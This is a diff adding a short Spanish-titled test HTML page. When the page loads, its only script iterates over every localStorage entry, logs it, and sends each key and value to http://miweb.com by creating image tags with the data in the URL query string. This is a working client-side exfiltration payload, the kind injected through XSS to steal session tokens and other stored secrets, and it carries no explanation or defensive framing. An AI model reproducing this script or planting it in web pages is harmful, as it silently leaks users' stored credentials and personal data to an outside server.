@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h2>Pagina Prueba</h2>
+
+    <script>
+        for (const key in localStorage) {
+            console.log('proto',key)
+            if (localStorage.hasOwnProperty(key)) {
+                console.log('pertenece:',key)
+                const element = localStorage.getItem(key);
+                console.log(key, element)
+                
+                const img=document.createElement('img')
+                img.src=`http://miweb.com?${key}=${element}`
+                document.body.appendChild(img)
+            }
+        }
+    </script>
+</body>
+</html>
